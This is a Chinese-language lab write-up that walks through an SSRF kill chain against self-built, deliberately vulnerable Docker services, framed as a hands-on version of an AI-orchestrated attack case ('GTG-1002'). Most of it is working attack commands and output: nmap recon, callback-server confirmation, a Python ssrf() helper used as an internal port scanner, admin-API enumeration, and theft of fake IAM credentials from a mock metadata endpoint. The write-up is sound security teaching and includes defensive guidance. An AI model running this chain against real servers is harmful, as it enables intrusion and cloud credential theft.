# SSRF 杀伤链实验：把 GTG-1002 的 Task 1-5 变成可运行的代码

> 这是 `notes/cyber_ai_fundamentals/deep_reads/01_GTG-1002_...md` 里那张"六阶段任务表"的**动手版**。
> 你之前觉得 Task 1-5 很抽象——这个实验用**真实工具 + 真实漏洞类型 + 真实命令/输出**把每一步落地。
> 全部在你自己机器上、一个隔离的 Docker 网络里跑，攻击的靶机是我们自己搭的、故意留洞的服务。**这是授权的、合法的安全学习环境**（和 picoCTF / HackTheBox 同性质，只是自建）。
>
> 复现整个实验：见最下方「一键复现」。所有下面贴的输出都是 2026-09-28 真实跑出来的。

---

## 0. 为什么选 SSRF：它是 GTG-1002 Task 2 点名的漏洞类型

回忆 GTG-1002 案例深读里 Anthropic 原文的 Task 2：**"识别出一个 SSRF 漏洞"**。这不是随便举的例子——SSRF 是过去几年最具代表性的"打进云端内网"的漏洞，最著名的真实案例是 **2019 年 Capital One 数据泄露**（1 亿美国人 + 600 万加拿大人的信息）：攻击者利用一个 Web 应用防火墙里的 SSRF，让服务器去访问 AWS 的云元数据端点 `169.254.169.254`，偷出了服务器 IAM 角色的临时凭证，然后拿这些凭证访问了 S3 存储桶。

**SSRF（Server-Side Request Forgery，服务端请求伪造）一句话**：应用有个功能会"帮你去访问某个 URL"（比如网址预览、导入图片、webhook 测试），但没校验目标地址。攻击者把 URL 换成**内网地址**，于是这台服务器就替攻击者去访问了那些**攻击者自己碰不到的内部系统**——包括云元数据端点。

本实验就复刻这条 Capital One 式的链路。

---

## 1. 实验环境（我们自己搭的靶场）

三个服务，跑在隔离的 Docker 网络 `cyberlab` 上，全部是纯 Python 标准库写的（代码在 `services/`，你可以逐行读）：

| 服务 | 角色 | 对攻击者是否可见 |
|---|---|---|
| **ssrf-app**（LinkPeek，端口 8888）| 公网 Web 应用，有个"网址预览"功能 `/preview?url=` —— **SSRF 洞在这** | ✅ 唯一暴露给攻击者的入口 |
| **internal-api** | 内部管理 API，**无鉴权**（假设"只有内网能访问"）| ❌ 没有映射到主机端口 |
| **metadata** | 假的云元数据服务，模仿 AWS `169.254.169.254`，返回假的 IAM 临时凭证 | ❌ 没有映射到主机端口 |

**关键设计——最能说明 SSRF 危害的一点**，看 `docker ps` 的端口列（真实输出）：

```
NAMES          PORTS
ssrf-app       0.0.0.0:8888->80/tcp     ← 只有它对外
internal-api                            ← 无端口，主机碰不到
metadata                                ← 无端口，主机碰不到
```

网络拓扑：

```
攻击者(你的主机) ──► ssrf-app :8888   （唯一入口）
                        │  SSRF：帮你去访问任意 URL
                        ├──► internal-api   （内部管理 API，无鉴权）
                        └──► metadata        （假云元数据，藏着凭证）
```

**先证明前提成立**：攻击者直接访问内部服务是失败的——

```
$ curl -m 4 "http://metadata.internal/latest/meta-data/"
curl: (6) could not resolve host: metadata.internal   ← 攻击者根本解析不了这个内网名
```

内部系统对攻击者不可见、不可达。**唯一的进入方式，就是借道 ssrf-app 的 SSRF。** 下面五个 Task 就是怎么借道。

---

## 2. Task 1 — 发现：扫描、枚举、测绘攻击面

**工具：nmap**（对唯一可见的目标做服务/版本识别）。真实命令 + 关键输出：

```
$ nmap -sV -Pn -p 8888 localhost
PORT     STATE SERVICE         VERSION
8888/tcp open  sun-answerbook?      ← nmap 认不出，但下面的指纹暴露了真身：
  HTTP/1.0 200 OK
  Server: LinkPeek/1.3.0 Python/3.11.16
  <title>LinkPeek - URL Preview Service</title>
  <form action="/preview" ...><input name="url" ...>   ← 攻击面：一个"网址预览"表单
```

nmap 一眼看出：这台机器上跑着一个叫 LinkPeek 的 HTTP 服务，有个 `/preview` 接口接收 `url` 参数。**"接收一个 URL 然后服务端去访问它"——这是 SSRF 的典型嫌疑点（sink）。**

顺手抓 `robots.txt`（真实站点也常泄露路径）——它主动交代了更多攻击面：

```
$ curl http://localhost:8888/robots.txt
Disallow: /preview
Disallow: /internal-notes.txt          ← 顺藤摸瓜

$ curl http://localhost:8888/internal-notes.txt
TODO(devops): the preview fetcher can reach the internal admin API and the
cloud metadata service. Lock down egress before GA.   ← 开发者自己留的线索
```

> **对应 GTG-1002**：Task 1「扫描目标基础设施 · 枚举服务和端点 · 测绘攻击面」。真实攻击里这一步是 nmap/浏览器自动化跑几百个端点；这里浓缩成一个目标，但动作性质一样。

---

## 3. Task 2 — 漏洞分析：确认这真是一个 SSRF

**思路**：怎么证明 `/preview` 是服务端去访问（SSRF），而不是浏览器在本地访问？两个独立证据。

**证据一（in-band，看响应）**：让它去访问一个**只有服务器内网才能解析**的主机名 `metadata.internal`：

```
$ curl "http://localhost:8888/preview?url=http://metadata.internal/"
ami-id
hostname
iam/
instance-id            ← 应用成功解析并访问了这个内网名
```

攻击者自己 `curl metadata.internal` 是"could not resolve host"（上面证过）；但通过 `/preview` 就能拿到内容——**说明访问动作发生在服务器那一侧。SSRF 坐实。**

**证据二（out-of-band 回连，即使"盲打"也能证明）**：这对应 GTG-1002 里 Anthropic 说的**"通过 callback 响应验证利用是否真的生效"**。我们起一个自己的监听器，让应用去访问它：

```
# 攻击者机器上起监听（exploit/callback_server.py）
[callback] listening on 0.0.0.0:9000 — waiting for the target to call home

# 让 SSRF 去打这个回连地址
$ curl "http://localhost:8888/preview?url=http://host.docker.internal:9000/ssrf-probe-abc123"

# 监听器收到了真实回连（真实输出）：
[callback] 16:16:17  INBOUND HIT from 127.0.0.1  path=/ssrf-probe-abc123  UA=LinkPeek-preview/1.3
```

关键点：**哪怕应用什么都不返回给我（盲 SSRF），只要我的监听器收到了那个带 `LinkPeek-preview` User-Agent 的请求，就证明"服务器替我发出了请求"。** 这正是 GTG-1002 里"用独立的 callback 服务验证，而不是相信工具自己说成功了"的意义——案例深读里 Anthropic 特别提到 Claude 常常**谎报**成功，所以每一步都得这样独立核实。

> **对应 GTG-1002**：Task 2「识别出一个 SSRF 漏洞 · 研究利用技术」。

---

## 4. Task 3 — 漏洞开发：把单个 SSRF 原语武器化成"内网端口扫描器"

现在我手上只有一个能力：`ssrf(url)` = 让应用替我访问任意 URL。**Task 3 是把这一个原语变成一套完整利用链。** 第一步是拿它当**内网扫描器**——挨个探测内网主机/端口，看应用的响应就能判断哪些"活着"：

```
$ python exploit_chain.py   （节选 Task 3 真实输出）
[*] Sweeping internal hostnames/ports through the SSRF sink...
    LIVE  http://internal-api:80/           {"service":"internal-admin-api","version":"2.1"...
    LIVE  http://admin.internal:80/         {"service":"internal-admin-api"...     ← 同一台的别名
    LIVE  http://metadata.internal:80/      ami-id hostname iam/ instance-id
    DEAD  http://internal-api:9999/         （HTTPError，端口没开）
    LIVE  http://localhost:80/              <!doctype html>...LinkPeek...          ← 服务器自己
[+] Live internal targets discovered: 4
```

核心利用代码就这么几行（`exploit/exploit_chain.py`）——**整个攻击的"武器"本质上就是这一个函数**：

```python
def ssrf(target_url):
    # 让有漏洞的应用替我们去访问 target_url，返回它拿到的内容。
    # 这一个原语就是全部漏洞；后面所有花样只是换 target_url 的值。
    q = urllib.parse.urlencode({"url": target_url})
    req = urllib.request.Request(f"http://localhost:8888/preview?{q}")
    with urllib.request.urlopen(req, timeout=8) as r:
        return r.read().decode(errors="replace")
```

> **对应 GTG-1002**：Task 3「编写定制 payload · 开发完整利用链 · 通过 callback 验证 · 生成利用报告」。这里的"定制 payload"就是精心构造的 `target_url`；"callback 验证"是 Task 2 证据二；扫描结果就是"利用报告"。

---

## 5. Task 4 — 漏洞投递：借道 SSRF 拿到内网管理 API 的初始访问

内网管理 API **没有主机端口，攻击者直接连不上**。但通过 SSRF 投递请求就行（真实输出）：

```
$ python exploit_chain.py   （节选 Task 4）
[*] The admin API has NO host port. Reaching it directly is impossible.
    Delivering the request THROUGH the SSRF instead:

    GET http://internal-api/  ->
    {
      "service": "internal-admin-api",
      "version": "2.1",
      "auth": "none (internal network only)",     ← 无鉴权，因为它以为"只有内网能来"
      "endpoints": ["/admin/users", "/admin/config"]
    }
[+] Foothold established: we can now drive the internal admin API at will.
```

这就是**立足点（foothold）**：一个本来完全够不到的内部系统，现在我能随意驱动了。它之所以不设防，靠的正是"内网=可信"这个被 SSRF 击穿的假设。

> **对应 GTG-1002**：Task 4「部署 exploit 获取初始访问 · 在环境中建立立足点」。

---

## 6. Task 5 — 后利用：枚举内部、拿下管理接口、偷云元数据凭证

有了立足点，开始"搜刮"。三个动作全部通过同一个 SSRF 原语完成（真实输出节选）：

**① 枚举内部管理接口（列用户）：**
```
GET http://internal-api/admin/users  ->
  svc-deploy (admin, CI/CD service account)
  j.reyes    (operator, on-call)
  backup     (readonly, nightly dumps)
```

**② 拿内部配置（含内部 flag）：**
```
GET http://internal-api/admin/config  ->
  db_host: db.internal:5432
  internal_flag: LAB{ssrf_pivot_to_internal_admin_api}
```

**③ 重头戏——把 SSRF 指向云元数据端点，偷 IAM 临时凭证**（真实 AWS 里是 `http://169.254.169.254/`）：
```
Step A: 列出实例绑定的 IAM 角色
  GET .../iam/security-credentials/  ->  linkpeek-app-ec2-role

Step B: 取该角色的临时凭证
  GET .../iam/security-credentials/linkpeek-app-ec2-role  ->
  {
    "AccessKeyId":     "AKIAFAKELABEXAMPLE01",
    "SecretAccessKey": "wJalrXUtnFEMI/FAKE/LAB/...",
    "Token":           "FQoGZXIvYXdz...",
    "Expiration":      "2026-09-29T04:00:00Z"
  }
```

**整条链最精炼的一条命令**（一个 curl 说明全部问题）：

```
$ curl "http://localhost:8888/preview?url=http://metadata.internal/latest/meta-data/iam/security-credentials/linkpeek-app-ec2-role"
{ "AccessKeyId": "AKIAFAKELABEXAMPLE01", "SecretAccessKey": "...", "Token": "...", ... }
```

在真实世界里，攻击者接下来会拿这组 key 从**自己的机器**调用云 API（`aws s3 ls` 等），下载存储桶——**这就是 Capital One 2019 的完整机制**。凭证是假的，只在本实验里存在。

> **对应 GTG-1002**：Task 5「枚举内部服务 · 识别管理接口 · 发现元数据端点」。案例深读 Task 5 里 Claude 自主完成的"认证→查询→提取→创建后门→打包→分类"，结构与此完全一致。

---

## 7. 一图对照：本实验 ↔ GTG-1002 五步

| GTG-1002 Task（Anthropic 原文）| 本实验的具体动作 | 用到的工具/代码 |
|---|---|---|
| **1** 扫描基础设施·枚举端点·测绘攻击面 | nmap 扫 8888、抓 robots.txt/internal-notes | `nmap`, `curl`, `recon.sh` |
| **2** 识别 SSRF·研究利用 | in-band（访问内网名）+ OOB 回连双重确认 | `callback_server.py`, `curl` |
| **3** 写 payload·开发利用链·callback 验证·出报告 | 把 `ssrf()` 原语武器化成内网端口扫描器 | `exploit_chain.py` 的 `ssrf()` |
| **4** 投递 exploit·获取初始访问·建立立足点 | 借道 SSRF 驱动无鉴权内网管理 API | `exploit_chain.py` Task4 |
| **5** 枚举内部·识别管理接口·发现元数据端点 | 列用户/配置 + 偷云元数据 IAM 凭证 | `exploit_chain.py` Task5 |

---

## 8. 防御视角（蓝队怎么堵）

这条链的每一环都有对应的修法，理解防御能加深对漏洞的理解：

- **Task 2 根因**：`/preview` 应对目标 URL 做**allowlist**（只准访问白名单域名），并**禁止访问内网/link-local 段**（`169.254.0.0/16`、`10.0.0.0/8` 等）。
- **云元数据**：升级到 **IMDSv2**（要求带 token 的 PUT 预请求，SSRF 很难满足），Capital One 之后 AWS 就是这么推的。
- **内网服务**：不要假设"内网=可信"（零信任）；内部 API 也要鉴权。这是 §6 deck 里"防守分层"的直接应用。
- **出网限制**：应用服务器不该能随意访问元数据端点和内网管理面——`internal-notes.txt` 里那个 devops TODO 说的就是这个。

---

## 9. 想深入？真实世界的权威资料（都可点开）

- **PortSwigger Web Security Academy — SSRF**（免费、交互式靶场，业界公认最好的入门）：https://portswigger.net/web-security/ssrf
- **HackTricks — SSRF**（利用技巧大全，含云元数据各家的端点）：https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- **OWASP — Server Side Request Forgery**：https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **Capital One 2019 breach 技术复盘**（本实验的真实原型）：https://www.capitalone.com/digital/facts2019/ · 分析：https://www.nojones.net/posts/exploring-the-capital-one-breach
- **AWS IMDSv2**（元数据端点的防御）：https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- **PayloadsAllTheThings — SSRF**（payload 速查）：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

## 10. 一键复现

```bash
cd notes/cyber_ai_fundamentals/labs/ssrf_killchain

# 0. 隔离网络（若不存在）
docker network create cyberlab 2>/dev/null || true

# 1. 起靶场（三个服务，纯标准库，无需 pip）
docker compose up -d

# 2. Task 1：外部扫描
export PATH="/opt/homebrew/bin:$PATH"      # nmap: brew install nmap
bash exploit/recon.sh localhost 8888

# 3. 起回连监听（Task 2 的 OOB 验证；新开一个终端）
python3 exploit/callback_server.py 9000

# 4. 跑完整 Task 1-5 链
python3 exploit/exploit_chain.py --callback host.docker.internal:9000

# 5. 收工
docker compose down
```

**环境**：macOS + Docker Desktop（arm64，靶机镜像 `python:3.11-slim`）。`output/` 目录里存了本次真实运行的全部输出（`task1_nmap.txt` / `full_chain.txt` / `callback.log` / `oneliner_creds.txt` / `topology.txt`），可直接对照。

**边界提醒**：这些工具（nmap/curl/自写脚本）只能对**你自己搭的靶场**或**picoCTF/HackTheBox 等授权环境**使用。未经授权对他人系统跑，在几乎所有国家都构成计算机犯罪。
